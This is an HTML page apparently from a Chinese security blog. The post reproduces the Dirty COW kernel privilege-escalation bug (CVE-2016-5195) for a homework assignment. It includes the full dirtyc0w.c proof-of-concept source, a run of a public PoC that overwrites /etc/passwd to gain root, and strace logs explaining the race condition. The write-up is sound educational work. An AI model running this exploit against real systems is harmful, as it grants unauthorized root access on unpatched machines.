@@ -1,0 +1,357 @@
+<!DOCTYPE html>
+<html lang="zh">
+  <head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="color-scheme" content="light dark">
+    <meta name="generator" content="Typst">
+    <title>漏洞分析之 CVE-2016-5195 | weyung's Blog</title>
+    <meta name="date" content="2025-04-14">
+    <link rel="canonical" href="https://weyung.cc/posts/21849513/">
+    <meta property="og:title" content="漏洞分析之 CVE-2016-5195 | weyung's Blog">
+    <meta property="og:type" content="article">
+    <meta name="description" content="Dirty Cow 提权漏洞复现。">
+    <meta property="og:description" content="Dirty Cow 提权漏洞复现。">
+    <meta property="og:url" content="https://weyung.cc/posts/21849513/">
+    <meta name="author" content="weyung">
+    <meta property="article:author" content="weyung">
+    <meta name="twitter:card" content="summary">
+    <meta name="language" content="zh">
+    <link rel="icon" href="/assets/avatar.png">
+    <link rel="preconnect" href="https://cdn.jsdelivr.net">
+    <link rel="dns-prefetch" href="https://cdn.jsdelivr.net">
+    <script type="text/javascript">
+      (function(){var key='typ-blog-theme';var theme=null;try{var stored=localStorage.getItem(key);if(stored==='gray-10'||stored==='gray-90'||stored==='gray-100'||stored==='white'){theme=stored;}}catch(_){ }if(!theme){theme=window.matchMedia('(prefers-color-scheme: dark)').matches?'gray-90':'gray-10';}document.documentElement.setAttribute('data-theme',theme);var bg=theme==='gray-90'?'#262626':theme==='gray-100'?'#161616':theme==='white'?'#ffffff':'#f4f4f4';document.documentElement.style.backgroundColor=bg;})();
+    </script>
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@ibm/plex-sans@1.1.0/css/ibm-plex-sans-all.min.css">
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@ibm/plex-mono@1.1.0/css/ibm-plex-mono-all.min.css">
+    <link rel="stylesheet" href="/assets/core/colors.css">
+    <link rel="stylesheet" href="/assets/core/main.css">
+    <link rel="stylesheet" href="/assets/custom.css">
+    <link rel="stylesheet" href="/assets/custom-toc.css">
+    <script type="module" src="/assets/core/render-code.js"></script>
+    <script type="module" src="/assets/core/theme.js"></script>
+    <script type="module" src="/assets/core/post-nav-switch.js"></script>
+    <script type="module" src="/assets/custom-toc.js"></script>
+  </head>
+  <body>
+    <div class="page-shell">
+      <header>
+        <div class="site-header">
+          <div class="nav-shell">
+            <nav>
+              <button class="nav-menu-switch" type="button" aria-label="打开导航"></button>
+              <div class="nav-title">weyung's Blog</div>
+              <div class="nav-body has-post-title">
+                <div class="nav-body-upper">
+                  <div class="nav-body-upper-title">weyung's Blog</div>
+                  <div class="nav-body-upper-links"><a href="/">首页</a><a href="/categories/">分类</a><a href="/tags/">标签</a><a href="/archive/">归档</a><a href="/links/">友链</a><a href="/about/">关于</a></div>
+                </div>
+                <div class="nav-body-lower">漏洞分析之 CVE-2016-5195</div>
+              </div>
+              <button class="nav-theme-switch" type="button" aria-label="切换主题"></button>
+            </nav>
+            <div class="nav-sidebar-backdrop"></div>
+            <aside class="nav-sidebar"><a class="nav-sidebar-item" href="/">首页</a><a class="nav-sidebar-item" href="/categories/">分类</a><a class="nav-sidebar-item" href="/tags/">标签</a><a class="nav-sidebar-item" href="/archive/">归档</a><a class="nav-sidebar-item" href="/links/">友链</a><a class="nav-sidebar-item" href="/about/">关于</a></aside>
+          </div>
+        </div>
+      </header>
+      <div class="post-header">
+        <div class="post-header-inner">
+          <h1>漏洞分析之 CVE-2016-5195</h1>
+        </div>
+      </div>
+      <article>
+        <section>
+          <h3>前言</h3>
+          <p>比较有名的漏洞，刚好系统安全的作业就是要复现这个漏洞，正好写了。</p>
+          <h3>复现</h3>
+          <p>中大镜像站内网镜像下载地址：<a href="https://mirrors.matrix.moe/ubuntu-releases/16.04/ubuntu-16.04.7-desktop-amd64.iso" target="_blank" rel="noopener noreferrer">https://mirrors.matrix.moe/ubuntu-releases/16.04/ubuntu-16.04.7-desktop-amd64.iso</a></p>
+          <p>下一个 Ubuntu 16.04 的镜像（这个是因为作业让我用这个版本，选其他的应该也行），看一下内核版本</p>
+          <pre><code class="language-bash">$ uname -a
+Linux ubuntu 4.15.0-112-generic #113~16.04.1-Ubuntu SMP Fri Jul 10 04:37:08 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux</code></pre>
+          <p>太新了，换个老点的 kernel，可以大概参考<a href="https://github.com/dirtycow/dirtycow.github.io/wiki/Patched-Kernel-Versions" target="_blank" rel="noopener noreferrer">官方的 Patched Kernel Versions</a>（但是好像不完全准确？），我选了 4.4.0</p>
+          <pre><code class="language-bash">sudo apt-get install linux-image-4.4.0-21-generic \
+                    linux-headers-4.4.0-21-generic</code></pre>
+          <p>再改一下 GRUB 配置</p>
+          <pre><code class="language-bash">sudo nano /etc/default/grub</code></pre>
+          <p>改成如下配置，没有的就加上</p>
+          <pre><code class="language-bash">GRUB_TIMEOUT=10
+GRUB_TIMEOUT_STYLE=menu</code></pre>
+          <p>然后更新一下 GRUB（别忘了）</p>
+          <pre><code class="language-bash">sudo update-grub</code></pre>
+          <p>重启一下，在 GRUB 菜单选择 <code class="language-text">Advanced options for Ubuntu</code>，然后选择 <code class="language-text">4.4.0-21-generic</code> 版本的内核，回车进入系统。</p>
+          <pre><code class="language-bash">uname -a
+Linux ubuntu 4.4.0-21-generic #37-Ubuntu SMP Mon Apr 18 18:33:37 UTC 2016 x86_64 x86_64 x86_64 GNU/Linux</code></pre>
+          <p>看到内核已经是老的了，可以开搞了。 去 GitHub 偷一个 PoC</p>
+          <pre><code class="language-bash">git clone https://github.com/gbonacini/CVE-2016-5195.git
+cd CVE-2016-5195
+make</code></pre>
+          <p>然后执行一下，root 就到手了</p>
+          <pre><code class="language-bash">$ ./dcow -s
+Running ...
+Password overridden to: dirtyCowFun
+
+Received su prompt (Password: )
+
+\cp /tmp/.ssh_bak /etc/passwd
+\rm /tmp/.ssh_bak
+root@ubuntu:~# echo 0 > /proc/sys/vm/dirty_writeback_centisecs
+root@ubuntu:~# \cp /tmp/.ssh_bak /etc/passwd
+root@ubuntu:~# \rm /tmp/.ssh_bak
+root@ubuntu:~#</code></pre>
+          <h4>拓展之 GRUB</h4>
+          <p>GRUB，全称 GRand Unified Bootloader，就是一个引导程序，是计算机启动时第一个加载的软件，负责加载操作系统的内核，然后由内核初始化操作系统的其他部分（如 shell、显示管理、桌面环境等）。</p>
+          <p>但是还有一个有意思的点 —— GRUB 既是引导程序，也是一个引导管理器。</p>
+          <p>那么引导管理器又是个什么东东呢？</p>
+          <p>也不复杂，它的作用就是让你能选择不同的操作系统（当然你得有两个以上的操作系统才有得选是吧）</p>
+          <h3>原理</h3>
+          <p>极致省流版原理：<strong>条件竞争导致只读文件被写入</strong></p>
+          <p>可以先说说这个命令的由来，相信熟悉 Docker 的同学对<strong>写时复制</strong>（Copy-On-Write）这个概念并不陌生，这个机制的意思就是一个资源被复制成两份时，如果双方都不存在修改，那么<strong>实际上就只会存在一份资源</strong>。熟悉 Python 的同学也可以尝试一下如下代码：</p>
+          <pre><code class="language-python">a = 1
+b = 1
+print(id(a), id(b))  # 140714691031848 140714691031848
+print(a is b)  # True
+a = 2
+print(id(a), id(b))  # 140714691031880 140714691031848</code></pre>
+          <p>这是个应用非常广泛的机制，就比如 <strong>VMWare 的快照</strong>，你应该好奇过它是怎么做到能保存一个状态但又没有复制一个完整的虚拟机，没错，它就 COW 机制的一个典型应用。</p>
+          <p>计组 review 之 —— dirty page，即脏页，指的是内存中被修改过但还没有写回磁盘的页面。</p>
+          <div class="quote-block">由于磁盘访问时间长达几千万个时钟周期，所以需要尽量减少访问磁盘特别是写入磁盘的操作</div>
+          <p>因为内存中的页只能使用写回机制写入磁盘 还需要在页表中添加一个<strong>脏位（Dirty Bit）</strong>，用于标记页是否被修改过，被修改过的才需要写回磁盘</p>
+          <h4>官方 PoC</h4>
+          <p>链接：<a href="https://github.com/dirtycow/dirtycow.github.io/blob/master/dirtyc0w.c" target="_blank" rel="noopener noreferrer">https://github.com/dirtycow/dirtycow.github.io/blob/master/dirtyc0w.c</a></p>
+          <p>以下对注释做了删减，对注释部分有兴趣的读者可以自行查看</p>
+          <pre><code class="language-c">#include &lt;stdio.h>
+#include &lt;sys/mman.h>
+#include &lt;fcntl.h>
+#include &lt;pthread.h>
+#include &lt;unistd.h>
+#include &lt;sys/stat.h>
+#include &lt;string.h>
+#include &lt;stdint.h>
+
+void *map;
+int f;
+struct stat st;
+char *name;
+
+void *madviseThread(void *arg)
+{
+    char *str;
+    str = (char *)arg;
+    int i, c = 0;
+    for (i = 0; i &lt; 100000000; i++)
+    {
+        c += madvise(map, 100, MADV_DONTNEED);
+    }
+    printf("madvise %d\n\n", c);
+}
+
+void *procselfmemThread(void *arg)
+{
+    char *str;
+    str = (char *)arg;
+    int f = open("/proc/self/mem", O_RDWR);
+    int i, c = 0;
+    for (i = 0; i &lt; 100000000; i++)
+    {
+        lseek(f, (uintptr_t)map, SEEK_SET);
+        c += write(f, str, strlen(str));
+    }
+    printf("procselfmem %d\n\n", c);
+}
+
+int main(int argc, char *argv[])
+{
+    if (argc &lt; 3)
+    {
+        (void)fprintf(stderr, "%s\n",
+                      "usage: dirtyc0w target_file new_content");
+        return 1;
+    }
+    pthread_t pth1, pth2;
+    f = open(argv[1], O_RDONLY);
+    fstat(f, &amp;st);
+    name = argv[1];
+    /*
+    You have to use MAP_PRIVATE for copy-on-write mapping.
+    > Create a private copy-on-write mapping.  Updates to the
+    > mapping are not visible to other processes mapping the same
+    > file, and are not carried through to the underlying file.  It
+    > is unspecified whether changes made to the file after the
+    > mmap() call are visible in the mapped region.
+    */
+    /*
+    You have to open with PROT_READ.
+    */
+    map = mmap(NULL, st.st_size, PROT_READ, MAP_PRIVATE, f, 0);
+    printf("mmap %zx\n\n", (uintptr_t)map);
+    pthread_create(&amp;pth1, NULL, madviseThread, argv[1]);
+    pthread_create(&amp;pth2, NULL, procselfmemThread, argv[2]);
+    pthread_join(pth1, NULL);
+    pthread_join(pth2, NULL);
+    return 0;
+}</code></pre>
+          <p>用法如下：</p>
+          <pre><code class="language-bash">$ sudo -s
+# echo this is not a test > foo
+# chmod 0404 foo
+$ ls -lah foo
+-r-----r-- 1 root root 19 Oct 20 15:23 foo
+$ cat foo
+this is not a test
+$ gcc -pthread dirtyc0w.c -o dirtyc0w
+$ ./dirtyc0w foo m00000000000000000
+mmap 56123000
+madvise 0
+procselfmem 1800000000
+$ cat foo
+m00000000000000000</code></pre>
+          <p>我们用 strace 来看看执行过程</p>
+          <pre><code class="language-bash">strace -f -o dirtyc0w.log ./dirtyc0w foo m00000000000000000</code></pre>
+          <p>我们来看 <code class="language-text">dirtyc0w.log</code> 的前面部分</p>
+          <pre><code class="language-bash">52725 execve("./dirtyc0w", ["./dirtyc0w", "foo", "m00000000000000000"], [/* 19 vars */]) = 0
+52725 brk(NULL)                         = 0x1461000
+52725 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
+52725 access("/etc/ld.so.preload", R_OK) = -1 ENOENT (No such file or directory)
+52725 open("/etc/ld.so.cache", O_RDONLY|O_CLOEXEC) = 3
+52725 fstat(3, {st_mode=S_IFREG|0644, st_size=88932, ...}) = 0
+52725 mmap(NULL, 88932, PROT_READ, MAP_PRIVATE, 3, 0) = 0x7fb97dacf000
+52725 close(3)                          = 0
+52725 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
+52725 open("/lib/x86_64-linux-gnu/libpthread.so.0", O_RDONLY|O_CLOEXEC) = 3
+52725 read(3, "\177ELF\2\1\1\0\0\0\0\0\0\0\0\0\3\0>\0\1\0\0\0\260`\0\0\0\0\0\0"..., 832) = 832
+52725 fstat(3, {st_mode=S_IFREG|0755, st_size=138696, ...}) = 0
+52725 mmap(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0x7fb97dace000
+52725 mmap(NULL, 2212904, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 3, 0) = 0x7fb97d6a3000
+52725 mprotect(0x7fb97d6bb000, 2093056, PROT_NONE) = 0
+52725 mmap(0x7fb97d8ba000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x17000) = 0x7fb97d8ba000
+52725 mmap(0x7fb97d8bc000, 13352, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0) = 0x7fb97d8bc000
+52725 close(3)                          = 0
+52725 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
+52725 open("/lib/x86_64-linux-gnu/libc.so.6", O_RDONLY|O_CLOEXEC) = 3
+52725 read(3, "\177ELF\2\1\1\3\0\0\0\0\0\0\0\0\3\0>\0\1\0\0\0`\t\2\0\0\0\0\0"..., 832) = 832
+52725 fstat(3, {st_mode=S_IFREG|0755, st_size=1868984, ...}) = 0
+52725 mmap(NULL, 3971488, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 3, 0) = 0x7fb97d2d9000
+52725 mprotect(0x7fb97d499000, 2097152, PROT_NONE) = 0
+52725 mmap(0x7fb97d699000, 24576, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x1c0000) = 0x7fb97d699000
+52725 mmap(0x7fb97d69f000, 14752, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0) = 0x7fb97d69f000
+52725 close(3)                          = 0
+52725 mmap(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0x7fb97dacd000
+52725 mmap(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0x7fb97dacc000
+52725 mmap(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0x7fb97dacb000
+52725 arch_prctl(ARCH_SET_FS, 0x7fb97dacc700) = 0
+52725 mprotect(0x7fb97d699000, 16384, PROT_READ) = 0
+52725 mprotect(0x7fb97d8ba000, 4096, PROT_READ) = 0
+52725 mprotect(0x601000, 4096, PROT_READ) = 0
+52725 mprotect(0x7fb97dae5000, 4096, PROT_READ) = 0
+52725 munmap(0x7fb97dacf000, 88932)     = 0
+52725 set_tid_address(0x7fb97dacc9d0)   = 52725
+52725 set_robust_list(0x7fb97dacc9e0, 24) = 0
+52725 rt_sigaction(SIGRTMIN, {0x7fb97d6a8b50, [], SA_RESTORER|SA_SIGINFO, 0x7fb97d6b4390}, NULL, 8) = 0
+52725 rt_sigaction(SIGRT_1, {0x7fb97d6a8be0, [], SA_RESTORER|SA_RESTART|SA_SIGINFO, 0x7fb97d6b4390}, NULL, 8) = 0
+52725 rt_sigprocmask(SIG_UNBLOCK, [RTMIN RT_1], NULL, 8) = 0
+52725 getrlimit(RLIMIT_STACK, {rlim_cur=8192*1024, rlim_max=RLIM64_INFINITY}) = 0
+52725 open("foo", O_RDONLY)             = 3
+52725 fstat(3, {st_mode=S_IFREG|0404, st_size=19, ...}) = 0
+52725 mmap(NULL, 19, PROT_READ, MAP_PRIVATE, 3, 0) = 0x7fb97dae4000
+52725 fstat(1, {st_mode=S_IFCHR|0620, st_rdev=makedev(136, 8), ...}) = 0
+52725 brk(NULL)                         = 0x1461000
+52725 brk(0x1482000)                    = 0x1482000
+52725 write(1, "mmap 7fb97dae4000\n\n", 19) = 19
+52725 mmap(NULL, 8392704, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS|MAP_STACK, -1, 0) = 0x7fb97cad8000
+52725 mprotect(0x7fb97cad8000, 4096, PROT_NONE) = 0
+52725 clone(child_stack=0x7fb97d2d7ff0, flags=CLONE_VM|CLONE_FS|CLONE_FILES|CLONE_SIGHAND|CLONE_THREAD|CLONE_SYSVSEM|CLONE_SETTLS|CLONE_PARENT_SETTID|CLONE_CHILD_CLEARTID, parent_tidptr=0x7fb97d2d89d0, tls=0x7fb97d2d8700, child_tidptr=0x7fb97d2d89d0) = 52726
+52726 set_robust_list(0x7fb97d2d89e0, 24 &lt;unfinished ...>
+52725 mmap(NULL, 8392704, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS|MAP_STACK, -1, 0 &lt;unfinished ...>
+52726 &lt;... set_robust_list resumed> )   = 0
+52725 &lt;... mmap resumed> )              = 0x7fb97c2d7000
+52726 madvise(0x7fb97dae4000, 100, MADV_DONTNEED &lt;unfinished ...>
+52725 mprotect(0x7fb97c2d7000, 4096, PROT_NONE) = 0
+52726 &lt;... madvise resumed> )           = 0
+52725 clone( &lt;unfinished ...>
+52726 madvise(0x7fb97dae4000, 100, MADV_DONTNEED &lt;unfinished ...>
+52725 &lt;... clone resumed> child_stack=0x7fb97cad6ff0, flags=CLONE_VM|CLONE_FS|CLONE_FILES|CLONE_SIGHAND|CLONE_THREAD|CLONE_SYSVSEM|CLONE_SETTLS|CLONE_PARENT_SETTID|CLONE_CHILD_CLEARTID, parent_tidptr=0x7fb97cad79d0, tls=0x7fb97cad7700, child_tidptr=0x7fb97cad79d0) = 52727
+52727 set_robust_list(0x7fb97cad79e0, 24 &lt;unfinished ...>
+52725 futex(0x7fb97d2d89d0, FUTEX_WAIT, 52726, NULL &lt;unfinished ...>
+52727 &lt;... set_robust_list resumed> )   = 0
+52726 &lt;... madvise resumed> )           = 0
+52726 madvise(0x7fb97dae4000, 100, MADV_DONTNEED) = 0
+52726 madvise(0x7fb97dae4000, 100, MADV_DONTNEED) = 0
+52726 madvise(0x7fb97dae4000, 100, MADV_DONTNEED) = 0
+52726 madvise(0x7fb97dae4000, 100, MADV_DONTNEED) = 0
+52726 madvise(0x7fb97dae4000, 100, MADV_DONTNEED) = 0
+52726 madvise(0x7fb97dae4000, 100, MADV_DONTNEED) = 0
+52726 madvise(0x7fb97dae4000, 100, MADV_DONTNEED) = 0
+52726 madvise(0x7fb97dae4000, 100, MADV_DONTNEED) = 0
+52726 madvise(0x7fb97dae4000, 100, MADV_DONTNEED) = 0
+52726 madvise(0x7fb97dae4000, 100, MADV_DONTNEED) = 0
+52726 madvise(0x7fb97dae4000, 100, MADV_DONTNEED) = 0
+52726 madvise(0x7fb97dae4000, 100, MADV_DONTNEED) = 0
+52726 madvise(0x7fb97dae4000, 100, MADV_DONTNEED) = 0
+52727 open("/proc/self/mem", O_RDWR &lt;unfinished ...>
+52726 madvise(0x7fb97dae4000, 100, MADV_DONTNEED) = 0
+52727 &lt;... open resumed> )              = 4
+52726 madvise(0x7fb97dae4000, 100, MADV_DONTNEED &lt;unfinished ...>
+52727 lseek(4, 140434654248960, SEEK_SET &lt;unfinished ...>
+52726 &lt;... madvise resumed> )           = 0
+52727 &lt;... lseek resumed> )             = 140434654248960
+52726 madvise(0x7fb97dae4000, 100, MADV_DONTNEED &lt;unfinished ...>
+52727 write(4, "m00000000000000000", 18 &lt;unfinished ...>
+52726 &lt;... madvise resumed> )           = 0
+52727 &lt;... write resumed> )             = 18</code></pre>
+          <p>其实你对应一下就发现这个跟 C 代码是非常对应的，52725 代表函数 <code class="language-text">main</code>，52726 代表 <code class="language-text">madviseThread</code>，52727 代表 <code class="language-text">procselfmemThread</code>。</p>
+          <p>可以看到函数 <code class="language-text">madviseThread</code> 先启动，一执行就有返回结果，然后 <code class="language-text">procselfmemThread</code> 也开始执行了，此时两个函数是并行的，比如 <code class="language-text">open</code> 执行了，被 <code class="language-text">madvise</code> 插一脚，<code class="language-text">madvise</code> 执行完后 <code class="language-text">open</code> 的结果才返回，并不是 <code class="language-text">main</code> 函数里和谐的顺序执行。</p>
+          <p>再看一眼结尾部分</p>
+          <pre><code class="language-bash">52727 lseek(4, 140434654248960, SEEK_SET) = 140434654248960
+52727 write(4, "m00000000000000000", 18) = 18
+52727 lseek(4, 140434654248960, SEEK_SET) = 140434654248960
+52727 write(4, "m00000000000000000", 18) = 18
+52727 lseek(4, 140434654248960, SEEK_SET) = 140434654248960
+52727 write(4, "m00000000000000000", 18) = 18
+52727 lseek(4, 140434654248960, SEEK_SET) = 140434654248960
+52727 write(4, "m00000000000000000", 18) = 18
+52727 lseek(4, 140434654248960, SEEK_SET) = 140434654248960
+52727 write(4, "m00000000000000000", 18) = 18
+52727 lseek(4, 140434654248960, SEEK_SET) = 140434654248960
+52727 write(4, "m00000000000000000", 18) = 18
+52727 write(1, "procselfmem 18000\n\n", 19) = 19
+52727 madvise(0x7fb97c2d7000, 8368128, MADV_DONTNEED) = 0
+52727 exit(0)                           = ?
+52725 &lt;... futex resumed> )             = 0
+52727 +++ exited with 0 +++
+52725 exit_group(0)                     = ?
+52725 +++ exited with 0 +++</code></pre>
+          <p>显然因为函数 <code class="language-text">procselfmemThread</code> 要执行 <code class="language-text">lseek</code> 和 <code class="language-text">write</code>，而 <code class="language-text">madviseThread</code> 只需要执行 <code class="language-text">madvise</code>，所以 <code class="language-text">procselfmemThread</code> 的执行时间会比 <code class="language-text">madviseThread</code> 长很多，到后面很大一部分时间都是 <code class="language-text">procselfmemThread</code> 在自己玩。</p>
+          <p>现在我们从整体分析一轮 PoC 干了什么：</p>
+          <ol>
+            <li>打开文件 <code class="language-text">foo</code>，并且用 <code class="language-text">mmap</code> 映射到内存中，使用 <code class="language-text">MAP_PRIVATE</code> 选项，表示这个映射是私有的，注意这个标志产生的效果是：对内存的修改不会影响到原文件，且通过 COW 机制创建一个私有副本。</li>
+            <li>启动线程 <code class="language-text">procselfmemThread</code>，它会打开 <code class="language-text">/proc/self/mem</code>，并且循环执行 <code class="language-text">lseek</code> 和 <code class="language-text">write</code> 操作，试图将 <code class="language-text">m00000000000000000</code> 写入进去</li>
+            <li>启动线程 <code class="language-text">madviseThread</code>，它会循环执行 <code class="language-text">madvise</code> 操作，试图忽悠内核，让内核丢掉进程的私有页，<strong>也就是 <code class="language-text">foo</code> 的私有副本</strong>，这样就会导致内核在执行 <code class="language-text">write</code> 时，发现 <code class="language-text">foo</code> 的私有副本已经不存在了，于是就会直接将数据写入到原文件 <code class="language-text">foo</code> 中，而不是私有副本中。</li>
+          </ol>
+          <p>当然以上仅仅是非常简单的原理概述，具体的细节需要详细了解相关的代码和标志位的含义。</p>
+          <h3>总结</h3>
+          <p>有种把最近学的都串起来的爽感，包括 COW、条件竞争这些。 当然也有没有深入学习 pwn 的遗憾，看起来 kernel 可玩的东西还是挺多的，这才是真正的登堂入室。</p>
+          <h3>参考</h3>
+          <p><a href="https://dirtycow.ninja/" target="_blank" rel="noopener noreferrer">CVE-2016-5195</a> <a href="https://blingblingxuanxuan.github.io/2023/05/02/230501-dirtycow-analysis/" target="_blank" rel="noopener noreferrer">经典内核漏洞复现之 dirtycow</a> <a href="https://itsfoss.com/what-is-grub/" target="_blank" rel="noopener noreferrer">Linux Jargon Buster: What is Grub in Linux? What is it Used for?</a> <a href="https://xuanxuanblingbling.github.io/ctf/pwn/2019/11/18/race/" target="_blank" rel="noopener noreferrer">条件竞争学习 之 DirtyCow分析</a></p>
+          <div class="post-meta">
+            <div class="post-tag"><span class="post-tag-desc">标签</span><span class="post-tag-group"><a class="post-tag-item tag-item-with-icon" href="/tags/web/" style="--tag-background:var(--tag-background-purple);--tag-color:var(--tag-color-purple);--tag-background-hover:var(--tag-hover-purple);--tag-border:var(--tag-border-purple);--tag-border-hover:var(--tag-border-purple);"><span class="tag-icon" style="mask-image:url(&quot;/assets/icons/tag-lucide-globe.svg&quot;);"></span><span class="tag-content"><span>Web</span></span></a><a class="post-tag-item tag-item-with-icon" href="/tags/渗透/" style="--tag-background:var(--tag-background-teal);--tag-color:var(--tag-color-teal);--tag-background-hover:var(--tag-hover-teal);--tag-border:var(--tag-border-teal);--tag-border-hover:var(--tag-border-teal);"><span class="tag-icon" style="mask-image:url(&quot;/assets/icons/tag-lucide-sword.svg&quot;);"></span><span class="tag-content"><span>渗透</span></span></a></span></div>
+            <div class="post-time"><span class="post-time-desc">日期</span><span>2025 年 4 月 14 日</span></div>
+            <div class="post-category"><span class="post-category-desc">分类</span><a class="post-category-link" href="/categories/cve/">CVE</a></div>
+          </div>
+          <div class="post-license">
+            <div class="post-license-item"><span class="post-license-label">文章作者</span><span>weyung</span></div>
+            <div class="post-license-item"><span class="post-license-label">文章链接</span><a href="https://weyung.cc/posts/21849513/">https://weyung.cc/posts/21849513/</a></div>
+            <div class="post-license-item"><span class="post-license-label">许可协议</span><a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank" rel="noopener noreferrer">CC BY-NC-SA 4.0</a></div>
+          </div>
+        </section>
+      </article>
+      <div class="post-neighbors">
+        <div class="post-neighbors-inner"><a class="post-neighbor" href="/posts/91356ab7/"><div class="post-neighbor-top">上一篇</div><p class="post-neighbor-title">漏洞分析之 CVE-2021-44228</p></a><a class="post-neighbor" href="/posts/083fa785/"><div class="post-neighbor-top">下一篇</div><p class="post-neighbor-title">CodeQL 从入门到哪里我也不知道啊啊啊</p></a></div>
+      </div>
+      <footer>
+        <div class="post-footer">2026 ~ Present Carbon Typst Blog</div>
+      </footer>
+    </div>
+  </body>
+</html>
